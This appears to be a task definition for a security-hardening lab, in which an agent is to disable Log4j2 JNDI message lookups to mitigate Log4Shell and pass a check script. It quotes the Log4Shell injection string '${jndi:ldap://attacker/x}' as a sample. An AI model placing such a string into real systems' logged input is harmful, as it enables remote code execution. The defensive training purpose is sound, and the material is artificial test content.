description: 'CONTEXT: A team operating security hardening needs you to resolve `Log4Shell (CVE-2021-44228)
  — Disable JNDI Message Lookups` during a realistic incident. The business impact is reduced service
  reliability until the underlying state is repaired.


  ENVIRONMENT: You are working in FixitLab''s offline hardening lab with SSH, firewall, TLS, audit logs,
  and IAM settings. All tools run locally; no paid APIs or external cloud calls are required.


  SYMPTOM / STARTING STATE: A Spring Boot app logs request headers with a vulnerable Log4j2. /app/src/main/resources/log4j2.component.properties
  does not disable message lookups, so ${jndi:ldap://...} in a header is interpreted. A Java service bundles
  a vulnerable Log4j2 version and JNDI message lookups are enabled, so an attacker who gets a string like
  ${jndi:ldap://attacker/x} into any logged field can achieve remote code execution (Log4Shell). The lookup
  substitution must be turned off and the runtime hardened so logged user input can no longer trigger
  a JNDI fetch.


  OBJECTIVE: Confirm Log4j2 JNDI message lookups are enabled (vulnerable); Disable lookup substitution
  via log4j2.formatMsgNoLookups=true; Ensure the hardening is loaded by the runtime (component properties
  on the classpath). Success means `check.sh` exits successfully.


  WHAT TO AVOID: Do not apply broad destructive changes, skip evidence gathering, or fake completion with
  marker files — the checker validates real system state.'
objectives:
- Confirm Log4j2 JNDI message lookups are enabled (vulnerable)
- Disable lookup substitution via log4j2.formatMsgNoLookups=true
- Ensure the hardening is loaded by the runtime (component properties on the classpath)
- Verify a ${jndi:...} payload in a log message no longer triggers a lookup
